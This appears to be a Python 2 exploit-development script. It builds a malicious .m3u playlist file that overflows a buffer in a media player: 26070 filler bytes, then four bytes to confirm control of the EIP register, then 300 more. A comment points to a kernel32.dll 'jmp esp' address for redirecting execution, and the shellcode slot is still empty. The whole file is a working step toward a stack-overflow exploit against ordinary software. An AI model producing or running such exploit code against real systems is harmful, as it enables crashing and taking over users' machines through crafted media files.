import struct
#kernel32.dll jmp esp using fndjump.exe

shellcode = ("")

buffer = "A"*26070+"B"*4+"C"*300
try:
        fl = open("_03_eip_of_confirm.m3u","w")
        fl.write(buffer)
        fl.close()
except:
        print "failed"
